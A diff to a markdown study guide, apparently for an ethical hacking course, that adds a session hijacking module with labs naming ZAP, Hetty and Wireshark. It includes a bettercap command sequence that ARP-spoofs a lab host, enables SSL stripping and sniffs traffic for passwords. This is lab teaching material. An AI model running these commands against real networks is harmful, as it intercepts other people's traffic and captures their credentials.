@@ -718,3 +718,29 @@
 - [DOSarrest's DDoS protection service](https://www.dosarrest.com)
 - [DDoS-GUARD](https://ddos-guard.net)
 - [Cloudflare](https://www.cloudflare.com)
+
+
+
+## Module 11: Session Hijacking
+### Lab 1: Perform Session Hijacking
+#### Task 1: Hijack a Session using Zed Attack Proxy (ZAP)
+- `Zed Attack Proxy(ZAP)`
+#### Task 2: Intercept HTTP Traffic using bettercap
+- ```sh
+  bettercap -iface eth0
+  >> net.probe on
+  >> net.recon on
+  >> set http.proxy.sslstrip true
+  >> set arp.spoof.internal true
+  >> set arp.spoof.targets 10.10.1.11
+  >> http.proxy on
+  >> arp.spoof on
+  >> net.sniff on
+  >> set net.sniff.regexp '.*password=.+' 
+  ```
+#### Task 3: Intercept HTTP Traffic using Hetty
+- `Hetty`
+
+### Lab 2: Detect Session Hijacking
+#### Task 1: Detect Session Hijacking using Wireshark
+- `Wireshark`
